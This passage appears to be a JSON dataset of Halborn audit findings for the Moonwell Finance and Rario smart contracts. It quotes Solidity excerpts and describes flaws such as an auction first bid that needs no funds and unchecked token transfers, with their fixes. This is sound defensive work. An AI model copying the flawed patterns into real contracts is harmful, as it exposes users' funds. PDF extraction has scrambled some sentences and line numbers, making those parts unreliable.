by removing payable keyword and call.value() method from the execute() function on GovernorAlpha.sol contract. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e && 762cdc4cd9a8d09f29765f9e143b25af0ebe9720. 19 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Medium"
        ]
    },
    {
        "title": "SHORT CIRCUIT IS NECESSARY FOR GAS OPTIMIZATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "If votes variable is equal to zero on GovernorAlpha.sol:_castVote() method contract should short circuit itself to consume less gas. The following lines will be executed even if votes amount is zero. Listing 8: GovernorAlpha.sol 280 if ( support ) { 281 282 283 } else { proposal . forVotes = add256 ( proposal . forVotes , votes ); proposal . againstVotes = add256 ( proposal . againstVotes ,  votes ); 284 285 286 287 288 289 290 291 } } receipt . hasVoted = true ; receipt . support = support ; receipt . votes = votes ; emit VoteCast ( voter , proposalId , support , votes ); Basically, the contract will call more functions such as add256() even it is not necessary. 20 If The same issue also exists on Well.sol:transferFrom() function. rawAmount parameter is equal to zero, the contract should short-circuit itself to prevent gas consume. The following lines will be executed even if rawAmount is equal to zero. Listing 9: Well.sol 162 if ( spender != src && spenderAllowance != uint96 ( -1) ) { 163 uint96 newAllowance = sub96 ( spenderAllowance , amount ,  \" Well :: transferFrom : transfer amount exceeds spender allowance \" ); allowances [ src ][ spender ] = newAllowance ; 164 165 166 167 168 169 170 emit Approval ( src , spender , newAllowance ); } _transferTokens ( src , dst , amount ); return true ; Code Location: Listing 10: Vulnerable Functions 1 GovernorAlpha . sol : _castVote ( address voter , uint proposalId , bool  support ) 2 Well . sol : transferFrom ( address src , address dst , uint rawAmount ) Risk Level: Likelihood - 3 Impact - 1 21 Recommendation: It is suggested to apply the following implementations for functions above. Listing 11: GovernorAlpha.sol 278 uint96 votes = well . getPriorVotes ( voter , proposal . startBlock ); 279 if ( votes == 0) { return ; 280 281 } 282 283 . . . Listing 12: Well.sol 165 uint96 amount = safe96 ( rawAmount , \" Well :: approve : amount exceeds  96 bits \" ); 166 if ( amount == 0) { 167 emit Transfer ( src , dst , 0) ; // emitting event is still  necessary for following up the transfer standart . 168 169 } 170 171 return true ; . . . Remediation Plan: NOT APPLICABLE: This issue was marked as NOT APPLICABLE since the rec- ommendation does not fit to intended behavior of Compound Protocol. Furthermore, Moonwell Team stay as close to the original contracts as possible, even if they are not completely optimal concerning gas effi- ciency, so that improvements to the original contracts may be adopted without significant refactoring, and the community can have better cer- tainty that they function similarly to other contracts with the same code. 22 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "GOVERNORALPHA DOES NOT CONTROL QUEUED PROPOSALS ON CANCEL METHOD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The cancel(uint proposalId) The cancel function is used to cancel the proposals. There is a check on the contract to do not cancel executed proposals. If the state of a proposal is not QUEUED yet, the contract will revert to cancel function. However, it will consume gas to achieve this. There is a missing control on the contract to only cancel QUEUED proposals. Code Location: Listing 13: GovernorAlpha.sol 210 function cancel ( uint proposalId ) public { 211 212 ProposalState state = state ( proposalId ); require ( state != ProposalState . Executed , \" GovernorAlpha ::  cancel : cannot cancel executed proposal \" ); 213 214 215 Proposal storage proposal = proposals [ proposalId ]; require ( msg . sender == guardian || well . getPriorVotes (  proposal . proposer , sub256 ( block . number , 1) ) < proposalThreshold () ,  \" GovernorAlpha :: cancel : proposer above threshold \"); 216 217 218 219 proposal . canceled = true ; for ( uint i = 0; i < proposal . targets . length ; i ++) { timelock . cancelTransaction ( proposal . targets [ i ],  proposal . values [i ], proposal . signatures [ i], proposal . calldatas [ i],  proposal . eta ); 220 221 222 223 } } emit ProposalCanceled ( proposalId ); 23 Risk Level: Likelihood - 3 Impact - 1 Recommendation: It is recommended to implement an additional check to control only QUEUED proposals are sent to this function. Listing 14: GovernorAlpha.sol (Line 212) 210 function cancel ( uint proposalId ) public { 211 212 ProposalState state = state ( proposalId ); require ( state == ProposalState . Queued , \" GovernorAlpha ::  cancel : Current proposal is not queued . \" ); Remediation Plan: NOT APPLICABLE: This issue was marked as NOT APPLICABLE since the recom- mendation does not fit to intended behavior of Compound Protocol. A proposal is eligible to be cancelled at any time before its execu- tion, including while queued in the Timelock, using this function. 24 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECKS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Moonwell-Core contracts have multiple input fields on their both public and private functions. Some of these inputs are required as address variable. During the test, it has seen all of these inputs are not protected against using the address(0) as the target address. It is not recommended to use zero address as target addresses on the contracts. Code Location: Listing 15: Missing Zero Address Checks 1 ChainlinkOracle . setAdmin ( address ). newAdmin ( contracts / Chainlink /  ChainlinkOracle . sol #88) 2 Comptroller . _setBorrowCapGuardian ( address ). newBorrowCapGuardian (  contracts / Comptroller . sol #968) 3 Comptroller . _setPauseGuardian ( address ). newPauseGuardian ( contracts  / Comptroller . sol #986) 4 Comptroller . setWellAddress ( address ). newWellAddress ( contracts /  Comptroller . sol #1351) 5 MErc20 . initialize ( address , ComptrollerInterface , InterestRateModel ,  uint256 , string , string , uint8 ). underlying_ ( contracts / MErc20 . sol #21) 6 MToken . _setPendingAdmin ( address ). newPendingAdmin ( contracts / MToken  . sol #1144) 7 MErc20Delegator . constructor ( address , ComptrollerInterface ,  InterestRateModel , uint256 , string , string , uint8 , address , address ,  bytes ). admin_ ( contracts / MErc20Delegator . sol #31) 8 MErc20Delegator . _setImplementation ( address , bool , bytes ).  implementation_ ( contracts / MErc20Delegator . sol #60) 9 MErc20Immutable . constructor ( address , ComptrollerInterface ,  InterestRateModel , uint256 , string , string , uint8 , address ). admin_ (  contracts / MErc20Immutable . sol #29) 10 MGlimmer . constructor ( ComptrollerInterface , InterestRateModel ,  uint256 , string , string , uint8 , address ). admin_ ( contracts / MGlimmer .  sol #27) 25 11 Reservoir . constructor ( uint256 , EIP20Interface , address ). target_ (  contracts / Reservoir . sol #32) 12 Timelock . constructor ( address , uint256 ). admin_ ( contracts / Timelock .  sol #26) 13 Timelock . executeTransaction ( address , uint256 , string , bytes , uint256 ).  target ( contracts / Timelock . sol #81) 14 Unitroller . _setPendingImplementation ( address ).  newPendingImplementation ( contracts / Unitroller . sol #38) 15 Unitroller . _setPendingAdmin ( address ). newPendingAdmin ( contracts /  Unitroller . sol #85) Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to implement additional zero address checks to avoid usage of zero addresses contracts. Remediation Plan: RISK ACCEPTED: The Moonwell Team accepts the risk of this finding. Except the ChainlinkOracle contract, all the contracts mentioned require the new admin key to execute the _acceptPendingAdmin function, which protects against accidental attempts to set the admin or guardian to the zero address. It was decided not to make any changes. 26 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE PRAGMA DEFINITION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Moonwell contracts use different pragma versions. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using another pragma, for example, either an outdated pragma ver- sion that might introduce bugs that affect the contract system negatively or a recently released pragma version which has not been extensively tested. The latest pragma version (0.8.11) was released in December 2021. Many pragma versions have been lately released, going from version 0.7.x to the recently released version 0.8.x. in just few months. Reference: Solidity Releases In the Solidity GitHub repository, there is a JSON file with all bugs It should be noted that finding in the different compiler versions. pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Reference: Solidity bugs by version Code Location: Different pragma versions in use: Listing 16 1 DAIInterestRateModel . sol - Pragma Version 0.5.16 2 Other Contracts - Pragma Version 0.5.17 27 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider locking and using a single pragma version without known bugs for the compiler version. If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities, such as a pragma between 0.6.12 - 0.7.6, or the latest pragma 0.8.9 - 0.8.11. For example, after the Solidity v 0.8.x, arithmetic operations revert to underflow and overflow by default. By using this version, utility contracts like SafeMath.sol would not be needed. Remediation Plan: issue SOLVED: This DAIInterestRateModel.sol community, so this contract has been removed from the repository. Moonwell Team. by solved contract used was not the the by is The Moonwell 28 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED FUNCTION PARAMETERS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "During the test, it was determined that a variable on the contract was not used for any purpose, although it was defined on the contract. This situation does not pose any risk in terms of security. But it is important for the readability and applicability of the code. baseRatePerYear The DAIInterestRateModelV3.sol contract is unused on that function. updateJumpRateModel parameter of function on Code Location: Listing 17: DAIInterestRateModelV3.sol (Line 51) require ( msg . sender == owner , \" only the owner may call this 51 function updateJumpRateModel ( uint baseRatePerYear , uint gapPerYear  , uint jumpMultiplierPerYear , uint kink_ ) external { 52  function .\" ); 53 54  kink_ ); 55 56 gapPerTimestamp = gapPerYear / timestampsPerYear ; updateJumpRateModelInternal (0 , 0 , jumpMultiplierPerYear , poke () ; } Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to review baseRatePerYear variable, and delete it from the contract if this variable will be remained unused in the future. 29 Remediation Plan: This issue SOLVED: The solved DAIInterestRateModel.sol contract is not used by the Moonwell community, so this contract has been removed from the repository. Moonwell Team. has the was by 30 ",
        "labels": [
            "Halborn",
            "Moonwell_Finance",
            "Severity: Informational"
        ]
    },
    {
        "title": "INCORRECT LOGIC LEADS TO DOS IN AUCTION SALES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract Marketplace.sol, the function placeBid is used to buy an NFT token listing. If the listingType is a RESERVE_PRICE_AUCTION, the function follows this code: Listing 1: Marketplace.sol - placeBid (Lines 331,332,370,374) 330 else if ( listing . listingType == ListingType . RESERVE_PRICE_AUCTION ) 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 { if ( listing . endTime == 0) { // If this is the first bid , ensure it 's >= the reserve price require ( listing . price <= bidValueInListingCurrency , \" NFTMarketReserveAuction : Bid must be at least the reserve price \" ); listing . price = bidValueInListingCurrency ; listing . buyerPaymentWallet = payable ( msgSender () ); listing . buyerTokenWallet = payable ( buyerTokenWallet ); listing . bidCurrency = currency ; listing . bidAmount = bidValue ; // On the first bid , the endTime is now + duration listing . endTime = block . timestamp + listing . duration ; emit AuctionBidPlaced ( listing . listingId , msgSender () , bidValue , listing . endTime ); } else { // If this bid outbids another , confirm that the bid is at least x % greater than the last require ( listing . endTime >= block . timestamp , \" NFTMarketReserveAuction : Auction is over \" ); require ( listing . buyerPaymentWallet != msgSender () , \" NFTMarketReserveAuction : You already have an outstanding bid \" ); uint256 minAmount = ( listing . price * ( BASIS_POINTS + _auctionPercentIncrementInBasisPoints )) / 14 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 BASIS_POINTS ; require ( bidValueInListingCurrency >= minAmount , \" NFTMarketReserveAuction : Bid amount too low \" ); // Cache and update bidder state before a possible reentrancy ( via the value transfer ) uint256 originalAmount = listing . bidAmount ; address payable originalBidder = listing . buyerPaymentWallet ; listing . price = bidValueInListingCurrency ; listing . bidCurrency = currency ; listing . bidAmount = bidValue ; listing . buyerPaymentWallet = payable ( msgSender () ); listing . buyerTokenWallet = payable ( buyerTokenWallet ); // When a bid outbids another , check to see if a time extension should apply . if ( listing . endTime - block . timestamp < listing . extensionDuration ) { listing . endTime = block . timestamp + listing . extensionDuration ; } if ( currencyType == 2) { IERC20 ( currencyContractAddress ). transferFrom ( msgSender () , address ( this ) , bidValue ); } emit AuctionBidPlaced ( listing . listingId , msgSender () , bidValue , listing . endTime ); _sendValue ( originalBidder , originalAmount , _gasLimitMedium ); 375 376 } } For the first bid, if (listing.endTime == 0) code block, the contract does not call sendValue nor transferFrom(msgSender(), address(this), bidValue );. This means that a user can place a bid as high as he wants and the contract would not check if the user actually owns those tokens. If the amount bid is high enough, none else would be able to place a higher bid. This happens because after the first bid, the contract does require the user to send the tokens to the contract by calling sendValue 15 and transferFrom function as seen above. Denial of Service example First bid vs. Second bid Risk Level: Likelihood - 3 Impact - 5 Recommendation: It is recommended to force the bidder of the first bid to transfer the amount into the contract following the same logic that the smart contract currently has now for all the bids that are not the first one. This can be achieved by simply adding these lines into the if (listing.endTime == 0) 16 code block: Listing 2: Marketplace.sol - placeBid 1 if ( currencyType == 2) { 2 IERC20 ( currencyContractAddress ). transferFrom ( msgSender () , address ( this ) , bidValue ); 3 } 4 5 _sendValue ( originalBidder , originalAmount , _gasLimitMedium ); Remediation Plan: SOLVED: Rario team successfully fixed the placeBid function logic, correcting this vulnerability. 17 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: High"
        ]
    },
    {
        "title": "OUTBID USER DOES NOT RECEIVE BACK HIS FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract Marketplace.sol, the function placeBid is used to buy an NFT token listing. In case that the listingType is a RESERVE_PRICE_AUCTION , when a user places a bid, the amount of tokens bid are transferred from his account to the contract address. Then, when a user outbids the previous user, the new user token amount bid is also transferred to the contract but the previous outbid user is not sent his bid tokens back: It is worth mentioning that this issue does not occur when the payment is done with NATIVE currency. In this case, the funds are sent back to the outbid user. The issue only happens when the payment is done with TOKENS. Risk Level: Likelihood - 3 Impact - 5 18 Recommendation: It is recommended that the smart contract sends back the bid tokens to the outbid user once a higher bid is placed. Remediation Plan: SOLVED: Rario team rightly modified the placeBid function and now refunds are given to the outbid users. 19 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: High"
        ]
    },
    {
        "title": "UNCHECKED TRANSFER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract Marketplace.sol the return value of some external transfer/transferFrom calls are not checked. Several tokens do not revert in case of failure and return false. If one of these tokens is used, a deposit would not revert if the transfer fails, and an attacker could deposit tokens for free. Code Location:  Line 370: IERC20(currencyContractAddress).transferFrom(msgSender() , address(this), bidValue);  Line 611: IERC20(contractAddress).transferFrom(msgSender(), _treasury, platformPayableAmount);  Line 612: IERC20(contractAddress).transferFrom(msgSender(), seller , sellerPayableAmount); Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to use SafeERC20. Remediation Plan: SOLVED: Rario team uses now SafeERC20 in all the transfers. 20 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Medium"
        ]
    },
    {
        "title": "USE OF TRANSFER WHEN TRANSFERRING NFTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract Marketplace.sol the function IERC721(_trustedToken). transferFrom is called when transferring the NFT:  Line 351: IERC721(_trustedToken).transferFrom(address(this), 539: IERC721(_trustedToken).transferFrom(_msgSender(), sellerTokenWallet, tokenId); address(this), tokenId);  Line  Line 622: IERC721(_trustedToken).transferFrom(address(this), listing.buyerTokenWallet, listing.tokenId); However, this function does not check whether the recipient is aware of the ERC721 protocol and calls _transfer directly. If the recipient is a contract not aware of incoming NFTs, then the transferred NFT would be locked in the recipient forever. Risk Level: Likelihood - 2 Impact - 2 Recommendation: It is recommended to use SafeTransferFrom which internally calls _safeTransfer the onERC721Received interface to avoid loss of NFTs. implements recipient checking contract the if Remediation Plan: SOLVED: Rario team uses IERC721.safeTransferFrom when sending the token from the smart contract to any user/wallet: 21 IERC721(_trustedToken).safeTransferFrom(address(this), listing. buyerTokenWallet, listing.tokenId); At the same time, to avoid implementing the onERC721Received function, Rario team has decided to keep using IERC721.transfer when transferring tokens from any user to their smart contract address: IERC721(_trustedToken).transferFrom(_msgSender(), address(this), tokenId); 22 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Low"
        ]
    },
    {
        "title": "UPDATEUSER FUNCTION MISSING REQUIRE STATEMENT",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract UserDB.sol the function addUser checks that the wallet address has not been added previously: Listing 3: UserDB.sol - addUser (Lines 45) 41 function addUser ( uint256 rarioId , address walletAddress ) external override { _checkRole ( OPERATOR , msgSender () ); require ( walletAddress != address (0) , ERR_ZERO_ADDRESS_WALLET ); require (! rarioIds . contains ( rarioId ) , ERR_USER_ALREADY_EXISTS ); require ( walletAddressToRarioId [ walletAddress ] == 0, ERR_WALLET_ALREADY_EXISTS ); rarioIds . add ( rarioId ); rarioIdToWalletAddress [ rarioId ] = walletAddress ; walletAddressToRarioId [ walletAddress ] = rarioId ; emit UserAdded ( rarioId , walletAddress ); 42 43 44 45 46 47 48 49 50 51 } The function updateUser allows to update that address but is missing that validation: Listing 4: UserDB.sol - updateUser 140 function updateUser ( uint256 rarioId , address walletAddress ) external override { _checkRole ( OPERATOR , msgSender () ); require ( walletAddress != address (0) , ERR_ZERO_ADDRESS_WALLET ); require ( rarioIds . contains ( rarioId ) , ERR_USER_DOES_NOT_EXIST ); address oldAddress = rarioIdToWalletAddress [ rarioId ]; rarioIdToWalletAddress [ rarioId ] = walletAddress ; walletAddressToRarioId [ walletAddress ] = rarioId ; delete walletAddressToRarioId [ oldAddress ]; 141 142 143 144 145 146 147 148 149 150 23 151 152 } emit UserUpdated ( rarioId , oldAddress , walletAddress ); This can cause some inconsistencies, for example, with the function getUserByAddress: Risk Level: Likelihood - 1 Impact - 3 Recommendation: It is recommended to add the missing require statement to the updateUser function. Remediation Plan: SOLVED: Rario team added the missing require statement: Listing 5: UserDB.sol - updateUser (Lines 144) 140 function updateUser ( uint256 rarioId , address walletAddress ) external override { _checkRole ( OPERATOR , _msgSender () ); require ( walletAddress != address (0) , ERR_ZERO_ADDRESS_WALLET ); require ( rarioIds . contains ( rarioId ) , ERR_USER_DOES_NOT_EXIST ); require ( walletAddressToRarioId [ walletAddress ] == 0, ERR_WALLET_ALREADY_EXISTS ); address oldAddress = rarioIdToWalletAddress [ rarioId ]; 141 142 143 144 145 146 24 147 148 149 150 151 152 153 } rarioIdToWalletAddress [ rarioId ] = walletAddress ; walletAddressToRarioId [ walletAddress ] = rarioId ; delete walletAddressToRarioId [ oldAddress ]; emit UserUpdated ( rarioId , oldAddress , walletAddress ); 25 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Low"
        ]
    },
    {
        "title": "MINT FUNCTION IN RARIOPOLYGONNFT DOES NOT VERIFY IF TOKEN WAS WITHDRAWN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The contract RarioPolygonNFT, as per the documentation, contains the functions deposit, withdraw and mint. The mint function is inherited from RarioNFT and contains the following code: Listing 6: RarioNFT.sol - mint 39 function mint ( address to , uint256 tokenId ) external virtual { 40 41 42 } _checkRole ( OPERATOR , msgSender () ); _mint (to , tokenId ); The function does not verify if the token was withdrawn previously as it is done in ChildMintableERC721.sol: Listing 7: ChildMintableERC721.sol - mint (Lines 2268,2273) 2264 /* * 2265 * @notice Example function to handle minting tokens on matic chain 2266 2267 * @dev Minting can be done as per requirement , * This implementation allows only admin to mint tokens but it can be changed as per requirement 2268 * Should verify if token is withdrawn by checking ` withdrawnTokens ` mapping * @param user user for whom tokens are being minted * @param tokenId tokenId to mint */ 2269 2270 2271 2272 function mint ( address user , uint256 tokenId ) public only ( 2273 DEFAULT_ADMIN_ROLE ) { require (! withdrawnTokens [ tokenId ], \" ChildMintableERC721 : TOKEN_EXISTS_ON_ROOT_CHAIN \"); 26 2274 2275 } _mint ( user , tokenId ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to check in RarioPolygonNFT if the token was withdrawn before minting. Remediation Plan: SOLVED: Rario team modified the mint function in RarioPolygonNFT. Now the function checks if the token was withdrawn before minting: Listing 8: RarioPolygonNFT.sol - mint (Lines 34) 32 function mint ( address user , uint256 tokenId ) external override { 33 34 _checkRole ( OPERATOR , _msgSender () ); require (! withdrawnTokens [ tokenId ], \" ChildMintableERC721 : TOKEN_EXISTS_ON_ROOT_CHAIN \"); _mint ( user , tokenId ); 35 36 } 27 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In the contract Marketplace.sol there are functions marked as public but they are never directly called within the same contract or in any of its descendants: Marketplace.sol - getPendingWithdrawal(address) (Marketplace.sol#387-389) - withdraw() (Marketplace.sol#394-396) Risk Level: Likelihood - 1 Impact - 1 Recommendation: If the function is not intended to be called internally or by descendants, it is better to mark all these functions as external to save gas. Remediation Plan: SOLVED: Rario team declared those functions as external. 28 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED CONSTANTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following constants are not used anywhere in the code. Code Location: Listing 9: ERC721NFT.sol 30 string internal constant E_NFT_TRANSFER_TO_NON_RECEIVER = \" E03001 \" ; Listing 10: Marketplace.sol 57 string private constant ERR_CURRENCY_MANAGER = \" NFTMarketplace : Error in CurrencyManager \"; Risk Level: Likelihood - 1 Impact - 1 Recommendation: Check whether these constants should be used and if not remove them in order to save gas. Remediation Plan: SOLVED: Rario team removed these unused constants. 29 ",
        "labels": [
            "Halborn",
            "Rario",
            "Severity: Informational"
        ]
    },
    {
        "title": "UNUSED EVENTS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Rario_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The following events are declared but they are not emitted by any function: Listing 11: MetadataDB.sol 105 event TokenStringValueUpdated ( uint256 indexed tokenId , string indexed attribute , string value ); 106 event TokenNumberValueUpdated ( uint256 indexed tokenId , string indexed attribute , int256 value ); 107 event TokenBooleanValueUpdated ( uint256 indexed tokenId , string indexed attribute , bool value ); Listing 12: Marketplace.sol 140 event WithdrawPending ( address indexed user , uint256 amount ); Listing 13: CurrencyManager.sol 97 event BaseCurrencyUpdated ( string indexed symbol ); Listing 14: MarketplaceConfig.sol 49 event TokenPriceFeedUpdated ( address indexed newAddress , address indexed oldAddress , string symbol ); Risk Level: Likelihood - 1 Impact - 1 30 Recommendation: Check whether these events should be used and if not remove them. Remediation Plan: SOLVED: Rario team removed all the unused events from their smart contracts. 31 MANUAL TESTING 32 4.1 INTRODUCTION Halborn performed different manual tests in all the contracts trying to find logic flaws and vulnerabilities that were not detected by the automatic tools. During the manual testing multiple questions were considered while evaluating each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Can a function be called twice in the same block causing issues?  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation. . .  Are the function parameters and variables controlled by external contracts?  Can extended contracts cause issues on the extender contract? G N I T S E T L A U N A M 33 4.2 UPGRADEABLE CONTRACTS ARCHITECTURE As our first test, architecture was correct. Upgradeable: we validated that the upgradeable contracts This is the hierarchy of the contract 1. ERC1967Upgrade: This abstract contract provides getters and event emitting update functions for EIP1967 slots. 2. ERC1822UUPS: Inherits from ERC1967Upgrade. This contract is used as an upgradeability mechanism designed for UUPS proxies. Correctly initializes ERC1967Upgrade: Listing 15: ERC1822UUPS.sol - initializeERC1822UUPS (Lines 22) 21 function initializeERC1822UUPS () internal initializer { 22 23 } initializeERC1967Upgrade () ; 3. Upgradeable: Inherits from ERC1822UUPS, Constants, Initializable, AccessRoles and Pausable. Correctly initializes all of its parent contracts: Listing 16: Upgradeable.sol - initializeUpgradeable 16 function initializeUpgradeable ( address trustedForwarder ) internal initializer { setTrustedForwarder ( trustedForwarder ); initializeAccessControl () ; initializePausable () ; initializeERC1822UUPS () ; _setupRole ( DEFAULT_ADMIN_ROLE , msgSender () ); _setupRole ( SUPER_RARIO , msgSender () ); _setupRole ( RARIO_ADMIN , msgSender () ); _setupRole ( OPERATOR , msgSender () ); 17 18 19 20 21 22 23 24 25 26 } 34 G N I T S E T L A U N A M Moreover, it overrides ERC1822UUPS._authorizeUpgrade function, adding the modifier whenPaused and checking that msgSender() has SUPER_RARIO role. This way the contract will only be able to be upgraded by members of the SUPER_RARIO group and only if the contract is paused. Listing 17: Upgradeable.sol - authorizeUpgrade 43 function _authorizeUpgrade ( address ) internal view override whenPaused { _checkRole ( SUPER_RARIO , msgSender () ); 44 45 } G N I T S E T L A U N A M 35 4.3 CONTRACTS INITIALIZATION No issues found on the initialization. Although: 1. CurrencyManager, ERC721NFT, MarketplaceConfig and RarioEthereumNFT init functions should be kept as internal as they are missing the initializer modifier. 2. We recommend calling initializeReentrancyGuard() in the contract Marketplace initializeMarketplace function. G N I T S E T L A U N A M 36 G N I T S E T L A U N A M 37 4.4 RARIOCURRENCYMANAGER CONTRACT This The contract RarioCurrencyManager inherits from CurrencyManager. contract is used to store all the different attributes related to the tokens. The contract contains the following functions:  From CurrencyManager  _addCurrency(CurrencyManager.CurrencyType,string,address, uint8) (private)  _convert(string,string,uint256) (private)  _getCurrency(string) (private)  _getCurrencyPair(string) (private)  _memcmp(bytes,bytes) (internal)  _removeCurrency(string) (private)  _removeCurrencyPair(string) (private)  _setFiatDecimals(uint8) (private)  _strcmp(string,string) (internal)  addCryptoCurrency(string,address,uint8) (external)  addCurrencyPair(string,string,string,bool,uint8,address) (external)  addFiatCurrency(string) (external)  convert(string,string,uint256) (external)  getCurrency(string) (external)  getCurrencyByIndex(uint256) (external)  getCurrencyPair(string) (external)  getCurrencyPairByIndex(uint256) (external)  getFiatDecimals() (external)  getNativeCurrency() (external)  initializeCurrencyManager(string) (internal)  removeCurrency(string) (external)  removeCurrencyPair(string) (external)  setFiatDecimals(uint8) (external)  supportedCurrencies() (external)  supportedCurrencyPairs() (external) G N I T S E T L A U N A M 38  supportsCurrency(string) (external)  supportsCurrencyPair(string) (external)  totalSupportedCurrencies() (external)  totalSupportedCurrencyPairs() (external)  From RarioCurrencyManager  initialize(address,string) (external) As this contract was really simple our manual tests focused on checking that all the getter and setter functions were working as expected: The setter functions can only be called by RARIO_ADMIN. The getter functions can be called by anyone, except getFiatDecimals() which can only be called by OPERATORS. G N I T S E T L A U N A M 39 4.5 RARIODATA CONTRACT The contract RarioData inherits from MetadataDB. This contract is used to store all the different attributes related to the tokens. The contract contains the following functions:  From MetadataDB  _canSetValue(uint256,string) (private)  _getAttribute(string) (private)  addAttribute(string,string,MetadataDB.AttributeType,bool) (external)  depricate(string) (external)  existsAttribute(string) (external)  getAttribute(string) (external)  getAttributeByIndex(uint256) (external)  getAttributeCount() (external)  getBooleanValue(uint256,string) (external)  getNumberValue(uint256,string) (external)  getTextValue(uint256,string) (external)  setBooleanValue(uint256,string,bool) (external)  setDescription(string,string) (external)  setNumberValue(uint256,string,int256) (external)  setTextValue(uint256,string,string) (external)  From RarioData  initialize(address) (external) All the setter functions in this contract can only be called by users with the OPERATOR role except the function existsAttribute(string) which can be called by anyone. On the other hand, the setter functions can only be called by users with the RARIO_ADMIN role. We can see below how the different getter and setter functions are working as expected and also how they are restricted with the right access control policies: 40 G N I T S E T L A U N A M G N I T S E T L A U N A M 41 4.6 RARIOMARKETPLACE CONTRACT The contract RarioMarketplace inherits from Marketplace. The contract contains the following functions:  From Marketplace  _cancelListing(uint256) (private)  _createListing(uint256,uint256,string,address,address,address ,uint8) (private)  _distributeFunds(address,string,uint256) (private)  _finaliseListing(uint256) (private)  _getListingByListingId(uint256,bool) (private)  _isValidWallet(address) (private)  _reloadConfiguration() (private)  _sendValue(address,uint256,uint256) (private)  _transferToken(address,address,uint256) (private)  cancelListing(uint256) (external)  createAuction(uint256,uint256,string,address) (external)  createPrivateSale(uint256,uint256,string,address,address) (external)  createPublicSale(uint256,uint256,string,address) (external)  finalizeListing(uint256) (external)  getBidPriceInCurrency(uint256,string) (external)  getFinalisedListing(uint256) (external)  getListing(uint256) (external)  getListingByTokenId(uint256) (external)  getPendingWithdrawal(address) (public)  initializeMarketplace(address,address) (internal)  placeBid(uint256,address,string,uint256) (external)  reloadConfiguration() (external)  setMarketplaceConfig(address) (external)  updateListing(uint256,uint256) (external)  withdraw() (public)  withdrawFor(address) (public)  From RarioMarketplace 42 G N I T S E T L A U N A 